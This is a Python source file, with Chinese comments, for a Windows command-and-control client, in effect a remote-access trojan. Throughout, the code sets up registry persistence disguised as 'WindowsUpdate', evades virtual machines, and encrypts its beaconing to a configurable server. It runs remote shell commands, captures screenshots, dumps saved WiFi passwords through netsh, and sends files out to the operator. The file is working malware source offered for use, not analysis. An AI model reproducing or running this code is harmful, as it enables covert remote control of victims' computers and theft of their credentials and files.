import sys
import os
import argparse  # 添加到导入部分

# 添加项目根目录到Python路径
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 然后再导入其他模块
import socket
import json
import subprocess
import platform
import base64
import time
from PIL import ImageGrab, Image
import io
import winreg
import ctypes
import random
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes
import psutil  # 需要添加到requirements.txt
from datetime import datetime
import fnmatch

# 添加加密处理类
class CryptoHandler:
    def __init__(self):
        # 使用固定密钥（在实际应用中应该使用动态密钥）
        self.key = b'635ab6f704d54372' # 16字节AES密钥
        self.hmac_key = b'cb9de4ae4ff025d66f2d627e8cb08ce7' # HMAC密钥

    def encrypt(self, data):
        """
        加密数据
        1. 生成随机IV
        2. 使用AES-CBC加密
        3. 添加HMAC用于完整性验证
        """
        try:
            # 生成随机IV
            iv = get_random_bytes(16)
            
            # 创建AES加密器
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            
            # 填充数据
            data = data.encode()
            length = 16 - (len(data) % 16)
            data += bytes([length]) * length
            
            # 加密
            ciphertext = cipher.encrypt(data)
            
            # 组合IV和密文
            encrypted_data = iv + ciphertext
            
            # 计算HMAC
            h = HMAC.new(self.hmac_key, digestmod=SHA256)
            h.update(encrypted_data)
            
            # 组合最终数据: encrypted_data + hmac
            final_data = encrypted_data + h.digest()
            
            # Base64编码
            return base64.b64encode(final_data).decode()
            
        except Exception as e:
            raise Exception(f"加密错误: {str(e)}")

    def decrypt(self, data):
        """
        解密数据
        1. 验证HMAC
        2. 提取IV
        3. AES-CBC解密
        """
        try:
            # Base64解码
            data = base64.b64decode(data)
            
            # 分离HMAC
            hmac = data[-32:]  # SHA256 produces 32 bytes
            data = data[:-32]
            
            # 验证HMAC
            h = HMAC.new(self.hmac_key, digestmod=SHA256)
            h.update(data)
            try:
                h.verify(hmac)
            except:
                raise Exception("HMAC验证失败")
            
            # 提取IV
            iv = data[:16]
            ciphertext = data[16:]
            
            # 解密
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # 去除填充
            padding_length = decrypted[-1]
            decrypted = decrypted[:-padding_length]
            
            return decrypted.decode()
            
        except Exception as e:
            raise Exception(f"解密错误: {str(e)}")

class C2Client:
    def __init__(self, server_host='127.0.0.1', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.crypto = CryptoHandler()
        self.sleep_range = (1, 3)
        self.running = True
        
    def is_admin(self):
        """检查是否具有管理员权限"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
            
    def add_to_startup(self):
        """添加到启动项"""
        if platform.system() == "Windows":
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                                   winreg.KEY_SET_VALUE)
                executable = sys.executable
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, executable)
                winreg.CloseKey(key)
            except Exception:
                pass
    
    def check_vm(self):
        """检测虚拟机环境"""
        vm_signs = [
            "vmware",
            "virtualbox",
            "vbox",
            "qemu",
            "xen"
        ]
        
        # 检查进程名
        try:
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
            for sign in vm_signs:
                if sign in output:
                    return True
        except:
            pass
            
        return False
    
    def get_system_info(self):
        """收集系统信息"""
        try:
            info = {
                "hostname": platform.node(),
                "username": os.getlogin(),
                "process_id": os.getpid(),
                "process_name": sys.executable,
                "os": platform.system(),
                "os_version": platform.version(),
                "is_admin": self.is_admin()
            }
            return info
        except Exception as e:
            print(f"[!] 获取系统信息错误: {str(e)}")
            return {}
    
    def start(self):
        """启动客户端主循环"""
        while self.running:
            try:
                self.connect()
            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                print(f"[!] 主循环错误: {str(e)}")
            
            if self.running:
                sleep_time = random.uniform(30, 60)  # 重连延迟30-60秒
                print(f"[*] {sleep_time:.0f}秒后尝试重新连接...")
                time.sleep(sleep_time)
    
    def connect(self):
        print(f"[*] 正在尝试连接到服务器 {self.server_host}:{self.server_port}")
        
        # 检测环境
        if self.check_vm():
            print("[!] 检测到虚拟机环境")
            time.sleep(10)
            return
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            print(f"[+] 成功连接到服务器 {self.server_host}:{self.server_port}")
            
            # 发送系统信息
            sys_info = self.get_system_info()
            init_message = {
                "type": "init",
                "data": sys_info
            }
            encrypted_info = self.crypto.encrypt(json.dumps(init_message))
            self.socket.send(encrypted_info.encode())
            
            self.handle_commands()
            
        except Exception as e:
            print(f"[!] 连接错误: {str(e)}")
            if self.socket:
                self.socket.close()
    
    def handle_commands(self):
        print("[*] 开始处理命令...")
        while self.running:
            try:
                print("[*] 等待服务器命令...")
                data = self.socket.recv(8192)
                if not data:
                    print("[!] 接收到空数据，连接可能已断开")
                    break
                
                try:
                    # 解密和处理数据
                    decrypted_data = self.crypto.decrypt(data.decode())
                    command = json.loads(decrypted_data)
                    print(f"[*] 收到命令: {command}")
                    
                    # 执行命令
                    response = self.execute_command(command)
                    print(f"[*] 命令执行结果: {response}")
                    
                    # 加密并发送响应
                    encrypted_response = self.crypto.encrypt(json.dumps(response))
                    self.socket.send(encrypted_response.encode())
                    print("[*] 响应已发送")
                    
                except Exception as e:
                    print(f"[!] 处理命令时出错: {str(e)}")
                    # 发送错误响应
                    error_response = {
                        "status": "error",
                        "message": str(e)
                    }
                    encrypted_error = self.crypto.encrypt(json.dumps(error_response))
                    self.socket.send(encrypted_error.encode())
                
            except Exception as e:
                print(f"[!] 连接错误: {str(e)}")
                break
        
        print("[*] 命令处理循环结束")
        self.socket.close()
    
    def execute_command(self, command):
        try:
            cmd_type = command.get("command")
            args = command.get("args", {})
            
            print(f"[*] 执行命令类型: {cmd_type}, 参数: {args}")
            
            if cmd_type == "shell":
                return self.shell_command(args.get("command"))
            elif cmd_type == "screenshot":
                return self.take_screenshot()
            elif cmd_type == "wifi":
                return {"status": "success", "data": self.get_wifi_passwords()}
            elif cmd_type == "sysinfo":
                return {"status": "success", "data": self.get_detailed_system_info()}
            elif cmd_type == "upload":
                return self.receive_file(args.get("filename"), args.get("data"))
            elif cmd_type == "download":
                return self.send_file(args.get("filename"))
            elif cmd_type == "search":
                return self.search_files(args)
            else:
                return {"status": "error", "message": f"未知命令类型: {cmd_type}"}
                
        except Exception as e:
            return {"status": "error", "message": f"命令执行错误: {str(e)}"}
    
    def shell_command(self, command):
        try:
            if platform.system() == "Windows":
                # 使用gbk编码处理Windows中文
                process = subprocess.Popen(command, 
                                        shell=True, 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE,
                                        encoding='gbk',  # Windows默认使用GBK编码
                                        errors='replace')  # 处理无法解码的字符
            else:
                # Linux/Unix系统使用UTF-8
                process = subprocess.Popen(["/bin/bash", "-c", command],
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        encoding='utf-8',
                                        errors='replace')
                
            output, error = process.communicate()
            
            return {
                "status": "success",
                "output": output,  # 不需要decode，因为已经指定了encoding
                "error": error
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            
            # 保持原始尺寸，使用高质量设置
            screenshot.save(img_byte_arr, format='JPEG', quality=85, optimize=True)
            img_data = img_byte_arr.getvalue()
            
            print(f"[*] 截图大小: {len(img_data)} 字节")
            
            # 直接发送完整的截图数据
            response = {
                "status": "success",
                "type": "screenshot",
                "size": len(img_data),
                "data": base64.b64encode(img_data).decode()
            }
            
            # 加密并发送
            encrypted_data = self.crypto.encrypt(json.dumps(response))
            self.socket.send(encrypted_data.encode())
            
            return {"status": "success", "message": "Screenshot sent successfully"}
            
        except Exception as e:
            print(f"[!] 截图错误: {str(e)}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    def get_wifi_passwords(self):
        """获取所有保存的WiFi密码"""
        try:
            # 检查管理员权限
            if not self.is_admin():
                return [{"ssid": "ERROR", "password": "需要管理员权限才能获取WiFi密码", "auth_type": "N/A", "encryption": "N/A"}]

            wifi_list = []
            # 获取WiFi配置文件列表
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('gbk', errors='ignore')
            profiles = [line.split(":")[1].strip() for line in data.split('\n') if "所有用户配置文件" in line]
            
            if not profiles:
                return [{"ssid": "ERROR", "password": "未找到WiFi配置文件", "auth_type": "N/A", "encryption": "N/A"}]
            
            print(f"[*] 找到 {len(profiles)} 个WiFi配置文件")
            
            for profile in profiles:
                try:
                    # 使用完整的命令路径
                    cmd = f'C:\\Windows\\System32\\netsh.exe wlan show profile name="{profile}" key=clear'
                    wifi_data = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode('gbk', errors='ignore')
                    
                    # 提取信息
                    ssid = profile
                    password = "未找到密码"
                    auth_type = "未知"
                    encryption = "未知"
                    
                    # 查找密码
                    for line in wifi_data.split('\n'):
                        if "SSID 名称" in line:
                            ssid = line.split(":")[1].strip().strip('"')
                        elif "关键内容" in line:
                            password = line.split(":")[1].strip()
                        elif "身份验证" in line:
                            auth_type = line.split(":")[1].strip()
                        elif "密码加密" in line:
                            encryption = line.split(":")[1].strip()
                    
                    wifi_info = {
                        'ssid': ssid,
                        'password': password,
                        'auth_type': auth_type,
                        'encryption': encryption
                    }
                    
                    print(f"[+] 成功获取 {ssid} 的密码信息")
                    wifi_list.append(wifi_info)
                    
                except subprocess.CalledProcessError as e:
                    print(f"[!] 获取配置文件 {profile} 失败: {e.output.decode('gbk', errors='ignore') if e.output else str(e)}")
                    wifi_list.append({
                        'ssid': profile,
                        'password': f"获取失败: {str(e)}",
                        'auth_type': "获取失败",
                        'encryption': "获取失败"
                    })
                except Exception as e:
                    print(f"[!] 处理配置文件 {profile} 时出错: {str(e)}")
                    wifi_list.append({
                        'ssid': profile,
                        'password': f"处理错误: {str(e)}",
                        'auth_type': "处理错误",
                        'encryption': "处理错误"
                    })
            
            if not wifi_list:
                return [{"ssid": "ERROR", "password": "未能获取任何WiFi密码", "auth_type": "N/A", "encryption": "N/A"}]
            
            return wifi_list
            
        except subprocess.CalledProcessError as e:
            error_msg = e.output.decode('gbk', errors='ignore') if e.output else str(e)
            print(f"[!] 执行netsh命令失败: {error_msg}")
            return [{"ssid": "ERROR", "password": f"命令执行失败: {error_msg}", "auth_type": "N/A", "encryption": "N/A"}]
        except Exception as e:
            print(f"[!] 获取WiFi密码时出错: {str(e)}")
            return [{"ssid": "ERROR", "password": f"发生错误: {str(e)}", "auth_type": "N/A", "encryption": "N/A"}]
    
    def get_detailed_system_info(self):
        """获取详细的系统信息（不使用WMI）"""
        try:
            info = {
                "system": {
                    "os": platform.system(),
                    "version": platform.version(),
                    "machine": platform.machine(),
                    "processor": platform.processor(),
                    "hostname": platform.node(),
                    "username": os.getlogin(),
                    "is_admin": self.is_admin(),
                    "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
                }
            }
            
            # CPU信息
            cpu_info = {
                "physical_cores": psutil.cpu_count(logical=False),
                "total_cores": psutil.cpu_count(logical=True),
                "max_frequency": f"{psutil.cpu_freq().max:.2f}MHz" if psutil.cpu_freq() else "Unknown",
                "current_frequency": f"{psutil.cpu_freq().current:.2f}MHz" if psutil.cpu_freq() else "Unknown",
                "cpu_usage": f"{psutil.cpu_percent()}%"
            }
            info["cpu"] = cpu_info
            
            # 内存信息
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            memory_info = {
                "total": f"{memory.total / (1024**3):.2f} GB",
                "available": f"{memory.available / (1024**3):.2f} GB",
                "used": f"{memory.used / (1024**3):.2f} GB",
                "percent_used": f"{memory.percent}%",
                "swap_total": f"{swap.total / (1024**3):.2f} GB",
                "swap_used": f"{swap.used / (1024**3):.2f} GB",
                "swap_percent": f"{swap.percent}%"
            }
            info["memory"] = memory_info
            
            # 磁盘信息
            disk_info = []
            for partition in psutil.disk_partitions():
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    disk_info.append({
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "filesystem": partition.fstype,
                        "total": f"{partition_usage.total / (1024**3):.2f} GB",
                        "used": f"{partition_usage.used / (1024**3):.2f} GB",
                        "free": f"{partition_usage.free / (1024**3):.2f} GB",
                        "percent_used": f"{partition_usage.percent}%"
                    })
                except:
                    continue
            info["disks"] = disk_info
            
            # 网络信息
            network_info = []
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                for addr in interface_addresses:
                    if addr.family == socket.AF_INET:  # IPv4
                        network_info.append({
                            "interface": interface_name,
                            "ip": addr.address,
                            "netmask": addr.netmask,
                            "broadcast": addr.broadcast
                        })
            info["network"] = network_info
            
            # 进程信息
            process_info = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    process_info.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "username": proc.info['username'],
                        "memory_percent": f"{proc.info['memory_percent']:.1f}%"
                    })
                except:
                    continue
            info["processes"] = process_info[:10]  # 只返回前10个进程
            
            return info
            
        except Exception as e:
            print(f"[!] 系统信息收集错误: {str(e)}")
            return {
                "error": str(e),
                "basic_info": {
                    "os": platform.system(),
                    "version": platform.version(),
                    "hostname": platform.node(),
                    "username": os.getlogin()
                }
            }
    
    def receive_file(self, filename, data):
        """接收服务器发送的文件"""
        try:
            if not filename or not data:
                return {"status": "error", "message": "无效的文件名或数据"}
            
            try:
                # 解码文件数据
                file_data = base64.b64decode(data)
                
                # 确保文件名安全
                safe_filename = os.path.basename(filename)
                
                # 写入文件
                with open(safe_filename, 'wb') as f:
                    f.write(file_data)
                
                return {
                    "status": "success",
                    "message": f"文件 {safe_filename} 上传成功",
                    "size": len(file_data)
                }
            except Exception as e:
                return {"status": "error", "message": f"文件处理失败: {str(e)}"}
                
        except Exception as e:
            return {"status": "error", "message": f"文件上传失败: {str(e)}"}
    
    def send_file(self, filename):
        """分块发送文件到服务器"""
        try:
            if not filename or not os.path.exists(filename):
                return {"status": "error", "message": f"文件 {filename} 不存在"}
            
            # 获取文件信息
            file_info = os.stat(filename)
            chunk_size = 512 * 1024  # 512KB chunks
            
            # 发送文件信息
            init_message = {
                "status": "success",
                "type": "file_init",
                "filename": os.path.basename(filename),
                "total_size": file_info.st_size,
                "chunk_size": chunk_size,
                "modified": datetime.fromtimestamp(file_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            }
            
            encrypted_init = self.crypto.encrypt(json.dumps(init_message))
            self.socket.send(encrypted_init.encode())
            
            # 等待服务器确认
            time.sleep(0.1)
            
            # 分块读取和发送文件
            with open(filename, 'rb') as f:
                chunk_number = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                        
                    chunk_message = {
                        "status": "success",
                        "type": "file_chunk",
                        "chunk_number": chunk_number,
                        "data": base64.b64encode(chunk).decode()
                    }
                    
                    encrypted_chunk = self.crypto.encrypt(json.dumps(chunk_message))
                    self.socket.send(encrypted_chunk.encode())
                    time.sleep(0.1)  # 添加延迟防止数据混淆
                    
                    chunk_number += 1
            
            # 发送完成消息
            end_message = {
                "status": "success",
                "type": "file_end",
                "total_chunks": chunk_number
            }
            encrypted_end = self.crypto.encrypt(json.dumps(end_message))
            self.socket.send(encrypted_end.encode())
            
            return {"status": "success", "message": "File transfer started"}
            
        except Exception as e:
            return {"status": "error", "message": f"文件下载失败: {str(e)}"}
    
    def search_files(self, search_params):
        try:
            results = []
            if not search_params:
                return {"status": "error", "message": "未提供搜索参数"}
                
            start_path = search_params.get('path', '.')
            pattern = search_params.get('pattern', '*')
            max_depth = search_params.get('max_depth', -1)
            min_size = search_params.get('min_size', 0)
            max_size = search_params.get('max_size', float('inf'))
            extensions = search_params.get('extensions', [])
            content = search_params.get('content')
            
            # 转换为绝对路径并规范化
            start_path = os.path.abspath(os.path.normpath(start_path))
            
            if not os.path.exists(start_path):
                return {
                    "status": "error",
                    "message": f"路径不存在: {start_path}"
                }
            
            def check_file_content(file_path, keyword):
                """检查文件内容是否包含关键词"""
                try:
                    # 只检查文本文件
                    if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 限制10MB
                        return False
                        
                    text_extensions = {'.txt', '.log', '.ini', '.conf', '.py', '.java', '.cpp', '.c', '.h', '.xml', '.json'}
                    if not any(file_path.lower().endswith(ext) for ext in text_extensions):
                        return False
                        
                    with open(file_path, 'r', errors='ignore') as f:
                        return keyword.lower() in f.read().lower()
                except:
                    return False
            
            def should_process_file(file_path, file_name):
                """检查文件是否符合搜索条件"""
                try:
                    # 检查文件名模式
                    if not fnmatch.fnmatch(file_name.lower(), pattern.lower()):
                        return False
                    
                    # 检查扩展名
                    if extensions and not any(file_name.lower().endswith(ext.lower()) for ext in extensions):
                        return False
                    
                    # 检查文件大小
                    file_size = os.path.getsize(file_path)
                    if not (min_size <= file_size <= max_size):
                        return False
                    
                    # 检查文件内容
                    if content and not check_file_content(file_path, content):
                        return False
                    
                    return True
                except:
                    return False
            
            # 开始搜索
            for current_depth, (dir_path, dirs, files) in enumerate(os.walk(start_path)):
                # 检查搜索深度
                if max_depth >= 0 and current_depth > max_depth:
                    dirs.clear()  # 停止继续深入
                    continue
                
                # 处理每个文件
                for file_name in files:
                    try:
                        full_path = os.path.abspath(os.path.join(dir_path, file_name))
                        
                        # 检查路径是否有效
                        if not os.path.exists(full_path):
                            continue
                            
                        if should_process_file(full_path, file_name):
                            try:
                                file_stat = os.stat(full_path)
                                results.append({
                                    "name": file_name,
                                    "path": full_path,
                                    "size": file_stat.st_size,
                                    "modified": datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                                    "created": datetime.fromtimestamp(file_stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S')
                                })
                            except (OSError, IOError) as e:
                                print(f"获取文件信息时出错 {full_path}: {str(e)}")
                                continue
                            
                    except Exception as e:
                        print(f"处理文件时出错 {file_name}: {str(e)}")
                        continue
            
            return {
                "status": "success",
                "message": f"找到 {len(results)} 个文件",
                "data": results
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"搜索文件时出错: {str(e)}"
            }

def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description='C2 Client', add_help=False)  # 禁用默认的 -h/--help
    
    # 添加自定义帮助选项
    parser.add_argument('--help', '-?', action='help',
                      help='显示帮助信息')
    
    # 主机参数
    host_group = parser.add_mutually_exclusive_group()
    host_group.add_argument('-s', '--server', '--host', dest='host',
                         type=str, default='127.0.0.1',
                         help='连接地址 (默认: 127.0.0.1)')
    host_group.add_argument('-S', '--SERVER', '--HOST', dest='host',
                         type=str, default='127.0.0.1',
                         help=argparse.SUPPRESS)
    
    # 端口参数
    port_group = parser.add_mutually_exclusive_group()
    port_group.add_argument('-p', '--port', dest='port',
                         type=int, default=4444,
                         help='连接端口 (默认: 4444)')
    port_group.add_argument('-P', '--PORT', dest='port',
                         type=int, default=4444,
                         help=argparse.SUPPRESS)
    
    args = parser.parse_args()
    return args

if __name__ == "__main__":
    args = parse_args()
    
    # 使用命令行参数创建客户端
    client = C2Client(server_host=args.host, server_port=args.port)
    print(f"[*] 正在连接到服务器 {args.host}:{args.port}")
    client.start() 
